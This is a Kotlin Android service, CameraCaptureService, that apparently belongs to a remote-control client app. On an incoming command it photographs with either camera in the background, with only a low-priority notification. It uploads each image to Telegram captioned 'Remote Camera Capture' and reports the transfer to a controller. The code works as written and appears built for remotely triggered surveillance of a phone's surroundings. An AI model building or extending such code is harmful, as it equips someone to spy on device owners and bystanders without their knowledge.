package com.xeg911.appclient.camera

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.xeg911.appclient.core.device.DeviceIdentifier
import com.xeg911.appclient.data.remote.storage.TelegramStorageUploader
import com.xeg911.appclient.event.DeviceEventReporter
import com.xeg911.shared.data.model.event.DeviceEventStatus
import com.xeg911.shared.data.model.event.DeviceEventType
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.File
import javax.inject.Inject
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

@AndroidEntryPoint
class CameraCaptureService : LifecycleService() {

    @Inject
    lateinit var uploader: TelegramStorageUploader

    @Inject
    lateinit var eventReporter: DeviceEventReporter

    @Inject
    lateinit var deviceIdentifier: DeviceIdentifier

    private var isCapturing = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        if (isCapturing) return START_NOT_STICKY
        isCapturing = true

        val notificationId = intent?.getStringExtra(EXTRA_NOTIFICATION_ID) ?: ""
        val lensFacingStr = intent?.getStringExtra(EXTRA_LENS_FACING)

        val lensFacing = if (lensFacingStr.equals("FRONT", ignoreCase = true)) {
            CameraSelector.LENS_FACING_FRONT
        } else {
            CameraSelector.LENS_FACING_BACK
        }

        val channelId = "camera_capture"
        val nm = getSystemService(NotificationManager::class.java)
        if (nm.getNotificationChannel(channelId) == null) {
            val channel =
                NotificationChannel(channelId, "Camera Capture", NotificationManager.IMPORTANCE_LOW)
            nm.createNotificationChannel(channel)
        }

        // Start foreground
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Capturing Photo")
            .setContentText("A background photo capture is in progress")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        startForeground(NOTIFICATION_ID, notification)

        lifecycleScope.launch {
            try {
                captureAndUpload(lensFacing, notificationId)
            } catch (e: Exception) {
                Log.e(TAG, "Capture failed", e)
                eventReporter.reportNow(
                    type = DeviceEventType.FILE_TRANSFER,
                    status = DeviceEventStatus.FAILED,
                    notificationId = notificationId,
                    actionId = "CAPTURE_PHOTO",
                    data = mapOf("error" to (e.message ?: e.toString()))
                )
            } finally {
                stopForeground(true)
                stopSelf()
            }
        }

        return START_NOT_STICKY
    }

    private suspend fun getCameraProvider(): ProcessCameraProvider =
        suspendCancellableCoroutine { cont ->
            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cont.resume(future.get())
                } catch (e: Exception) {
                    cont.resumeWithException(e)
                }
            }, ContextCompat.getMainExecutor(this))
        }

    private suspend fun captureAndUpload(lensFacing: Int, notificationId: String) {
        val cameraProvider = getCameraProvider()

        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(lensFacing)
            .build()

        val imageCapture = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .build()

        try {
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)
        } catch (_: Exception) {
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, imageCapture)
        }

        val photoFile = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        suspendCancellableCoroutine { cont ->
            imageCapture.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                        lifecycleScope.launch {
                            try {
                                uploadPhoto(photoFile, notificationId)
                                cont.resume(Unit)
                            } catch (e: Exception) {
                                cont.resumeWithException(e)
                            }
                        }
                    }

                    override fun onError(exception: ImageCaptureException) {
                        cont.resumeWithException(exception)
                    }
                }
            )
        }
    }

    private suspend fun uploadPhoto(file: File, notificationId: String) {
        try {
            val fileBytes = file.readBytes()
            val deviceId = runCatching { deviceIdentifier.resolveDeviceId() }.getOrNull()
                ?: throw Exception("Device ID not resolved")

            val result = uploader.upload(
                deviceId = deviceId,
                fileBytes = fileBytes,
                fileName = file.name,
                mimeType = "image/jpeg",
                caption = "Remote Camera Capture"
            )

            if (result != null) {
                eventReporter.reportNow(
                    type = DeviceEventType.FILE_TRANSFER,
                    status = DeviceEventStatus.SUCCESS,
                    notificationId = notificationId,
                    actionId = "CAPTURE_PHOTO",
                    data = mapOf(
                        "downloadUrl" to result.downloadUrl,
                        "fileId" to result.fileId,
                        "fileName" to file.name,
                        "fileSize" to result.fileSize.toString(),
                        "mimeType" to "image/jpeg"
                    )
                )
            } else {
                throw Exception("Upload failed: Telegram API returned null")
            }
        } finally {
            file.delete()
        }
    }

    companion object {
        const val TAG = "CameraCaptureService"
        const val NOTIFICATION_ID = 4001
        const val EXTRA_NOTIFICATION_ID = "notificationId"
        const val EXTRA_LENS_FACING = "lensFacing"
    }
}
